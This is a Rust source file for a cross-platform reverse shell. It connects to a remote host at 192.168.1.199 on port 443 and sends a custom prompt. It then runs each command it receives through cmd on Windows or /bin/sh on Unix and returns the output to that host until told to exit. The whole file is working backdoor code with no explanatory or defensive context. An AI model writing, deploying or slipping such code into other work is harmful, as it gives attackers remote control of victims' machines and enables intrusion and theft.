use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() {
    let mut stream = TcpStream::connect("192.168.1.199:443").expect("Failed to connect to server");
    stream
        .write("aalphaas >> ".as_bytes())
        .expect("failed to send message to server");
    loop {
        let mut server_cmd: Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&mut stream);
        reader
            .read_until(b'\n', &mut server_cmd)
            .expect("command read error from server");

        let command = String::from_utf8_lossy(&server_cmd).to_string();
        println!("Command: {}", command);

        if command.trim_end() == "exit" {
            stream
                .write("Connection terminated".as_bytes())
                .expect("failed to send message to server");
            break;
        }

        #[cfg(windows)]
        {
            if let Ok(output) = Command::new("cmd").arg("/c").arg(command).output() {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                //println!("stdout: {}", stdout);
                // println!("stderr: {}", stderr);
                stream.write_all(stdout.as_bytes()).unwrap();
                stream.write_all(stderr.as_bytes()).unwrap();
                stream
                    .write("aalphaas >> ".as_bytes())
                    .expect("failed to send message to server");
            }
        }
        #[cfg(unix)]
        {
            if let Ok(output) = Command::new("/bin/sh").arg("-c").arg(command).output() {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                //println!("stdout: {}", stdout);
                // println!("stderr: {}", stderr);
                stream.write_all(stdout.as_bytes()).unwrap();
                stream.write_all(stderr.as_bytes()).unwrap();
                stream
                    .write("aalphaas >> ".as_bytes())
                    .expect("failed to send message to server");
            }
        }
    }
}
